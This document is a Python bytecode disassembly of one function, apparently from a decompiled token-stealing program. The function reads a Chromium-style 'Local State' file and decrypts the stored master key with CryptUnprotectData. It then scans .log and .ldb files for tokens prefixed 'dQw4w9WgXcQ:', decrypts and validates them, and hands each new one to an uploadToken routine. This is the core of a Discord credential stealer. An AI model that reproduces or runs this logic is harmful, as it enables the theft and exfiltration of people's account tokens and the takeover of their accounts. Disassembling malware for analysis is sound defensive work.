        82 LOAD_CONST                   None
        84 RETURN_VALUE                 
        86 LOAD_FAST_BORROW_LOAD_FAST_BORROW path, arg
        88 BINARY_OP                    +
       100 STORE_FAST                   pathC
       102 LOAD_FAST_BORROW             path
       104 LOAD_CONST                   '/Local State'
       106 BINARY_OP                    +
       118 STORE_FAST                   pathKey
       120 NOP                          
       122 LOAD_GLOBAL                  open + NULL
       132 LOAD_FAST_BORROW             pathKey
       134 LOAD_CONST                   'r'
       136 LOAD_CONST                   'utf-8'
       138 LOAD_CONST                   ('encoding',)
       140 CALL_KW                      
       148 COPY                         
       150 LOAD_SPECIAL                 __exit__
       152 SWAP                         
       154 SWAP                         
       156 LOAD_SPECIAL                 __enter__
       158 CALL                         
       166 STORE_FAST                   f
       168 LOAD_GLOBAL                  json_loads + NULL
       178 LOAD_FAST_BORROW             f
       180 LOAD_ATTR                    read + NULL|self
       200 CALL                         
       208 CALL                         
       216 STORE_FAST                   local_state
       218 LOAD_CONST                   None
       220 LOAD_CONST                   None
       222 LOAD_CONST                   None
       224 CALL                         
       232 POP_TOP                      
       234 LOAD_GLOBAL                  b64decode + NULL
       244 LOAD_FAST_CHECK              local_state
       246 LOAD_CONST                   'os_crypt'
       248 BINARY_OP                    []
       260 LOAD_CONST                   'encrypted_key'
       262 BINARY_OP                    []
       274 CALL                         
       282 STORE_FAST                   master_key
       284 LOAD_GLOBAL                  CryptUnprotectData + NULL
       294 LOAD_FAST_BORROW             master_key
       296 LOAD_CONST                   slice(5, None, None)
       298 BINARY_OP                    []
       310 CALL                         
       318 STORE_FAST                   master_key
       320 LOAD_GLOBAL                  os
       330 LOAD_ATTR                    path
       350 LOAD_ATTR                    exists + NULL|self
       370 LOAD_FAST_BORROW             pathC
       372 CALL                         
       380 TO_BOOL                      
       388 POP_JUMP_IF_TRUE             to L3
       392 NOT_TAKEN                    
       394 LOAD_CONST                   None
       396 RETURN_VALUE                 
       398 LOAD_GLOBAL                  os
       408 LOAD_ATTR                    listdir
       428 PUSH_NULL                    
       430 LOAD_FAST_BORROW             pathC
       432 CALL                         
       440 GET_ITER                     
       442 EXTENDED_ARG                 
       444 FOR_ITER                     to L14
       448 STORE_FAST                   file
       450 LOAD_FAST_BORROW             file
       452 LOAD_ATTR                    endswith + NULL|self
       472 LOAD_CONST                   '.log'
       474 CALL                         
       482 TO_BOOL                      
       490 POP_JUMP_IF_TRUE             to L5
       494 NOT_TAKEN                    
       496 LOAD_FAST_BORROW             file
       498 LOAD_ATTR                    endswith + NULL|self
       518 LOAD_CONST                   '.ldb'
       520 CALL                         
       528 TO_BOOL                      
       536 POP_JUMP_IF_TRUE             to L5
       540 NOT_TAKEN                    
       542 JUMP_BACKWARD                to L4
       546 NOP                          
       548 LOAD_GLOBAL                  open + NULL
       558 LOAD_FAST_BORROW             pathC
       560 FORMAT_SIMPLE                
       562 LOAD_CONST                   '\\'
       564 LOAD_FAST_BORROW             file
       566 FORMAT_SIMPLE                
       568 BUILD_STRING                 
       570 LOAD_CONST                   'ignore'
       572 LOAD_CONST                   ('errors',)
       574 CALL_KW                      
       582 COPY                         
       584 LOAD_SPECIAL                 __exit__
       586 SWAP                         
       588 SWAP                         
       590 LOAD_SPECIAL                 __enter__
       592 CALL                         
       600 STORE_FAST                   f
       602 LOAD_FAST_BORROW             f
       604 LOAD_ATTR                    readlines + NULL|self
       624 CALL                         
       632 STORE_FAST                   lines
       634 LOAD_CONST                   None
       636 LOAD_CONST                   None
       638 LOAD_CONST                   None
       640 CALL                         
       648 POP_TOP                      
       650 LOAD_FAST_CHECK              lines
       652 GET_ITER                     
       654 FOR_ITER                     to L13
       658 STORE_FAST                   line
       660 LOAD_GLOBAL                  re
       670 LOAD_ATTR                    findall
       690 PUSH_NULL                    
       692 LOAD_CONST                   'dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*'
       694 LOAD_FAST_BORROW             line
       696 LOAD_ATTR                    strip + NULL|self
       716 CALL                         
       724 CALL                         
       732 GET_ITER                     
       734 FOR_ITER                     to L12
       738 STORE_FAST                   token
       740 NOP                          
       742 LOAD_FAST_BORROW             token
       744 LOAD_ATTR                    split + NULL|self
       764 LOAD_CONST                   'dQw4w9WgXcQ:'
       766 CALL                         
       774 LOAD_SMALL_INT               
       776 BINARY_OP                    []
       788 STORE_FAST                   token_part
       790 LOAD_GLOBAL                  DecryptValue + NULL
       800 LOAD_GLOBAL                  b64decode + NULL
       810 LOAD_FAST_BORROW             token_part
       812 CALL                         
       820 LOAD_FAST_BORROW             master_key
       822 CALL                         
       830 STORE_FAST                   tokenDecoded
       832 LOAD_FAST_BORROW             tokenDecoded
       834 TO_BOOL                      
       842 POP_JUMP_IF_FALSE            to L11
       846 NOT_TAKEN                    
       848 LOAD_GLOBAL                  checkToken + NULL
       858 LOAD_FAST_BORROW             tokenDecoded
       860 CALL                         
       868 TO_BOOL                      
       876 POP_JUMP_IF_FALSE            to L10
       880 NOT_TAKEN                    
       882 LOAD_FAST_BORROW             tokenDecoded
       884 LOAD_GLOBAL                  Tokens
       894 CONTAINS_OP                  not in
       898 POP_JUMP_IF_FALSE            to L9
       902 NOT_TAKEN                    
       904 LOAD_GLOBAL                  Tokens
       914 LOAD_FAST_BORROW             tokenDecoded
       916 BINARY_OP                    +=
       928 STORE_GLOBAL                 Tokens
       930 LOAD_GLOBAL                  uploadToken + NULL
       940 LOAD_FAST_BORROW_LOAD_FAST_BORROW tokenDecoded, path
       942 CALL                         
       950 POP_TOP                      
       952 JUMP_BACKWARD                to L8
       956 JUMP_BACKWARD                to L8
       960 JUMP_BACKWARD                to L8
       964 JUMP_BACKWARD                to L8
       968 END_FOR                      
       970 POP_ITER                     
       972 JUMP_BACKWARD                to L7
       976 END_FOR                      
       978 POP_ITER                     
       980 EXTENDED_ARG                 
       982 JUMP_BACKWARD                to L4
       986 END_FOR                      
       988 POP_ITER                     
       990 LOAD_CONST                   None
       992 RETURN_VALUE                 
       994 PUSH_EXC_INFO                
       996 WITH_EXCEPT_START            
       998 TO_BOOL                      
      1006 POP_JUMP_IF_TRUE             to L15
      1010 NOT_TAKEN                    
      1012 RERAISE                      
      1014 POP_TOP                      
      1016 POP_EXCEPT                   
      1018 POP_TOP                      
      1020 POP_TOP                      
      1022 POP_TOP                      
      1024 EXTENDED_ARG                 
      1026 JUMP_BACKWARD_NO_INTERRUPT   to L2
      1028 COPY                         
      1030 POP_EXCEPT                   
      1032 RERAISE                      
      1034 PUSH_EXC_INFO                
      1036 WITH_EXCEPT_START            
      1038 TO_BOOL                      
      1046 POP_JUMP_IF_TRUE             to L16
      1050 NOT_TAKEN                    
      1052 RERAISE                      
      1054 POP_TOP                      
      1056 POP_EXCEPT                   
      1058 POP_TOP                      
      1060 POP_TOP                      
      1062 POP_TOP                      
      1064 JUMP_BACKWARD_NO_INTERRUPT   to L6
      1066 COPY                         
      1068 POP_EXCEPT                   
      1070 RERAISE                      
      1072 PUSH_EXC_INFO                
      1074 POP_TOP                      
      1076 POP_EXCEPT                   
      1078 JUMP_BACKWARD                to L8
      1082 COPY                         
      1084 POP_EXCEPT                   
      1086 RERAISE                      
      1088 PUSH_EXC_INFO                
      1090 POP_TOP                      
      1092 POP_EXCEPT                   
      1094 EXTENDED_ARG                 
      1096 JUMP_BACKWARD                to L4
      1100 COPY                         
      1102 POP_EXCEPT                   
      1104 RERAISE                      
      1106 PUSH_EXC_INFO                
      1108 POP_TOP                      
      1110 POP_EXCEPT                   
      1112 LOAD_CONST                   None
      1114 RETURN_VALUE                 
      1116 COPY                         
      1118 POP_EXCEPT                   
      1120 RERAISE                      
